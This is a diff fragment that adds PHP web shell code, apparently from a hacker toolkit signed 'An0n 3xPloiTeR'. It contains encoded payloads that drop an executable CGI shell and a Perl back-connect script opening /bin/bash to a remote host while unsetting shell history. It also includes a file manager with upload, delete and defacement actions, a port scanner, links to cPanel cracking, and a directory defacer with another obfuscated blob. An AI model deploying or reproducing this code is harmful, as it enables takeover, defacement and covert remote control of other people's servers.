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';
+        $file = @fopen("izo.cin", "w+");
+        $write = @fwrite($file, htmlspecialchars_decode(gzinflate(base64_decode($cgishellizocin))));
+        @fclose($file);
+        @chmod("izo.cin", 0755);
+        $netcatshell = 'IyEvdXNyL2Jpbi9wZXJsCnVzZSBJTzo6U29ja2V0OwokU2hlbGwJPSAiL2Jpbi9iYXNoIjsKJEFSR0M9QEFSR1Y7CnVzZSBTb2NrZXQ7CnVzZSBGaWxlSGFuZGxlOwpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoInRjcCIpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0XG4iOwpjb25uZWN0KFNPQ0tFVCwgc29ja2FkZHJfaW4oJEFSR1ZbMV0sIGluZXRfYXRvbigkQVJHVlswXSkpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gQ29ubmVjdCBIb3N0XG4iOwpwcmludCAiQ29ubmVjdGVkISI7ClNPQ0tFVC0+YXV0b2ZsdXNoKCk7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsIj4mU09DS0VUIik7CnByaW50ICJcdFx0XHRcdC0tPT0gQmFja2Rvb3IgQ29ubmVjdGVkID09LS0gIFxuXG5cdFx0XHRcdC0tPT0gQnkgQW4wbiAzeFBsb2lUZVIgPT0tLVxuXG4iOwpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVCA7ZWNobyAnWytdIFN5c3RlbWluZm86ICc7IHVuYW1lIC1hO2VjaG87ZWNobyAnWytdIFVzZXJpbmZvOiAnOyBpZDtlY2hvO2VjaG8gJ1srXSBEaXJlY3Rvcnk6ICc7IHB3ZDtlY2hvOyBlY2hvICdbK10gU2hlbGw6ICc7JFNoZWxsIik7CmNsb3NlIFNPQ0tFVDs=';
+        $file = fopen("dc.pl", "w+");
+        $write = fwrite($file, base64_decode($netcatshell));
+        fclose($file);
+        @chmod("dc.pl", 0755);
+        echo "<iframe src='izo.cin' width=100% height=300% frameborder=0></iframe> ";
+        echo '</div>';
+    printFooter();
+}
+ 
+ 
+function actioncleanshell()
+{
+   
+       $self= $_SERVER["PHP_SELF"]; // Where am i
+     header("location:$self?mini_shell");
+}
+function actioncpcrack()
+{
+   
+       $self= $_SERVER["PHP_SELF"]; // Where am i
+     header("location:$self?cp");
+}
+ 
+function actionFilesMan() {
+    printHeader();
+    echo '<h1>File manager</h1><div class=content>';
+    if(isset($_POST['p1']) && $_POST['p1']!='deface') {
+        switch($_POST['p1']) {
+            case 'uploadFile':
+                if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
+                    echo "Can't upload file!";
+                break;
+                break;
+            case 'mkdir':
+                if(!@mkdir($_POST['p2']))
+                    echo "Can't create new dir";
+                break;
+            case 'delete':
+                function deleteDir($path) {
+                    $path = (substr($path,-1)=='/') ? $path:$path.'/';
+                    $dh  = opendir($path);
+                    while ( ($item = readdir($dh) ) !== false) {
+                        $item = $path.$item;
+                        if ( (basename($item) == "..") || (basename($item) == ".") )
+                            continue;
+                        $type = filetype($item);
+                        if ($type == "dir")
+                            deleteDir($item);
+                        else
+                            @unlink($item);
+                    }
+                    closedir($dh);
+                    rmdir($path);
+                }
+                if(is_array(@$_POST['f']))
+                    foreach($_POST['f'] as $f) {
+                        $f = urldecode($f);
+                        if(is_dir($f))
+                            deleteDir($f);
+                        else
+                            @unlink($f);
+                    }
+                break;
+                       
+ 
+                   
+               
+            case 'paste':
+                if($_SESSION['act'] == 'copy') {
+                    function copy_paste($c,$s,$d){
+                        if(is_dir($c.$s)){
+                            mkdir($d.$s);
+                            $h = opendir($c.$s);
+                            while (($f = readdir($h)) !== false)
+                                if (($f != ".") and ($f != "..")) {
+                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
+                                }
+                        } elseif(is_file($c.$s)) {
+                            @copy($c.$s, $d.$s);
+                        }
+                    }
+                    foreach($_SESSION['f'] as $f)
+                        copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);                    
+                } elseif($_SESSION['act'] == 'move') {
+                    function move_paste($c,$s,$d){
+                        if(is_dir($c.$s)){
+                            mkdir($d.$s);
+                            $h = opendir($c.$s);
+                            while (($f = readdir($h)) !== false)
+                                if (($f != ".") and ($f != "..")) {
+                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
+                                }
+                        } elseif(is_file($c.$s)) {
+                            @copy($c.$s, $d.$s);
+                        }
+                    }
+                    foreach($_SESSION['f'] as $f)
+                        @rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
+                }
+                unset($_SESSION['f']);
+                break;
+            default:
+                if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
+                    $_SESSION['act'] = @$_POST['p1'];
+                    $_SESSION['f'] = @$_POST['f'];
+                    foreach($_SESSION['f'] as $k => $f)
+                        $_SESSION['f'][$k] = urldecode($f);
+                    $_SESSION['cwd'] = @$_POST['c'];
+                }
+                break;
+        }
+        echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
+    }
+ 
+    $dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
+    if($dirContent === false) {    echo 'Can\'t open this folder!'; return;    }
+    global $sort;
+    $sort = array('name', 1);
+    if(!empty($_POST['p1'])) {
+        if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
+            $sort = array($match[1], (int)$match[2]);
+    }
+    echo '<script>
+        function sa() {
+            for(i=0;i<document.files.elements.length;i++)
+            if(document.files.elements[i].type == \'checkbox\')
+                document.files.elements[i].checked = document.files.elements[0].checked;
+        }
+        </script>
+        <table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
+        <form name=files method=post>';
+    echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
+    $dirs = $files = $links = array();
+    $n = count($dirContent);
+    for($i=0;$i<$n;$i++) {
+        $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
+        $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
+        $tmp = array('name' => $dirContent[$i],
+                     'path' => $GLOBALS['cwd'].$dirContent[$i],
+                     'modify' => @date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
+                     'perms' => viewPermsColor($GLOBALS['cwd'].$dirContent[$i]),
+                     'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
+                     'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
+                     'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
+                    );
+        if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
+            $files[] = array_merge($tmp, array('type' => 'file'));
+        elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
+            $links[] = array_merge($tmp, array('type' => 'link'));
+        elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
+            $dirs[] = array_merge($tmp, array('type' => 'dir'));
+    }
+    $GLOBALS['sort'] = $sort;
+    function cmp($a, $b) {
+        if($GLOBALS['sort'][0] != 'size')
+            return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]])*($GLOBALS['sort'][1]?1:-1);
+        else
+            return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
+    }
+    usort($files, "cmp");
+    usort($dirs, "cmp");
+    usort($links, "cmp");
+    $files = array_merge($dirs, $links, $files);
+    $l = 0;
+    foreach($files as $f) {
+        echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
+            .'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
+        $l = $l?0:1;
+    }
+    echo '<tr><td colspan=5>
+    <input type=hidden name=a value=\'FilesMan\'>
+    <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
+    <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+    <select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>';
+    if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){echo '<option value=\'paste\'>Paste</option>'; }
+    echo '</select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="An0n_3xPloiTeR.html" size="10"/>&nbsp;<input type="button" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['cwd']).'\',\'deface\',document.getElementById(\'def\').value)" value="Submit"></td></tr>
+    </form></table></div>';
+    printFooter();
+}
+ 
+ 
+function actionPortScanner() {
+    printHeader();
+    echo '<center><h1>Port Scanner</h1></center>';
+    echo '<div class="content">';
+    echo '<form action="" method="post">';
+   
+    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
+        $start = strip_tags($_POST['start']);
+        $end = strip_tags($_POST['end']);
+        $host = strip_tags($_POST['host']);
+        for($i = $start; $i<=$end; $i++){
+            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
+            if($fp){
+                echo 'Port '.$i.' is <font color=aqua>open</font><br>';
+            }
+            flush();
+        }
+    } else {
+        echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
+              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
+              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+              Host: <input type="text" name="host" value="localhost"/><br /><br />
+              Port start: <input type="text" name="start" value="0"/><br /><br />
+              Port end:<input type="text" name="end" value="5000"/><br /><br />
+              <input type="submit" value="Scan Ports" />
+              </form></center><br /><br />';
+    }
+    echo '</div>';
+    printFooter();    
+}
+ 
+ 
+function actionDirDefacer() {
+    printHeader();
+    $dirdeface = "3RlrbyLJ8bMj5T90FGfHVmYA395uVljogrH3bAUby+DdXG4t1MwUTB8z03M9jYGL/N9T/ZgXxuBTVqfTIS/0o6q6Hl2vXvImkqd/OR/0Rj/cXpBQxtGbmTz985/Ucjk70FOggZ3quWQyArVwTbOMnMOU+kC6UUTOmQBfcsEgIx7pJq2EvF3dRpyN4E4hNgvMnFQMkhI/pCID2Xnz84LL0/vRR++DGZLmM9iExmABA8h8wVLJeGLBfZ5ISHJCl9SfQ0DO1pucvIJ2xH369QiHUqYe/Lxgj5aCgKmALNxK/eRDq2VGio62kueRj1yQO4PFkhm5pTNU+VSCIG/ft1rkCimIRxplhE+JZDEQz9sl35KLOdL56nqjE76Q/wdVYj9baS9kyMVW4nWSLrmPqSBdMQVIyDCk4esPmcMadRNkO2Rwz9auOtAtD3xJOPfXa1DAI8uY9Kgy7p4LsucO02S2wHuylQgkL5LIAZ0ZJCBo5BiijkCPSGbOTgzOZxHkCAYf48FOnCmPIr50aVQcFGfJhMtfiUQjWNF9aCmds0zSpOSQN9IIw5ea7sI0ymJJACu3PNuqsKJzowBk4/Wx4N/efdfr8ThF9U6i7da6uvAgKCxZIxqxZE4ERBZyeDm4G/XuR+SqN7ix8CGGG7utTm83m6zB4tlCNHweN69Wb6Pwc9z4KZ295lY9MlimXGx38iULZNgJ8Ar74OmJS1jCJKORl/loos7J7jOcDKjwQwLJjCWQOaXpusCWzO0qK+N3NArhM0xwJOknZVK3O+jfgJyiidDpflmCyNweTWhAXZOVLpl0LxaCDwHm7sXKZxLcwSMIuRDgfs/xT1nOveTyjEuMp1N+Tefuv2jCeYDr/bXPM/ea+hh+YaiQb3SCoGXWW7s3qJcQREL6bBZKd6hlucIBi9MIzNRFtrNrnsk+Gg6DCU5HPHU/h1R6957mDkVxf6Ah52qzJ+gyAuEqjrIK79fo2RG6uNvnfD7EeCfdCbqn27u5GFlhnntDJtdl/j2Y8GBN/muGGMBmgi+SwPN5xEWb/LX1ofXupGUgh727Qb9/1r3zPnZ7F15v0B/cKRD9OSUbMJdX31/28d9oH+Dwsns++LwP6qw7fHakBrGcLkPUh1l50t9c1wRWsi1QBxJWGGAjNkvaBH0fA63dmOJt85agrNcmEx4FlhmzMaUxi9aIshAZe8yJTTBdgPAimCocDCbz+oaw1J7vaGu0Ceqdl9SeGcIgEiNaBhHetT+kaCxJF1qyP5RslWup2KcC6A7r/d4FMXxk7BdE+9D6W9XpGoHuA8YpxqW6gAKC071S7LatOfFtq3ak7iiqEU0vVJoVNVcxrjIN2CPxI2xbih6iYLqsuXPi6ugX2pwtdaw6PMfImcHjqgS/S8MUFQlCcDEWoNIohuyj1jFCgB9yYnlAUKODvAOYchET6quw1vligOwPwdwZ8iBfTTGxfCkl+WKrPMWBPuAwY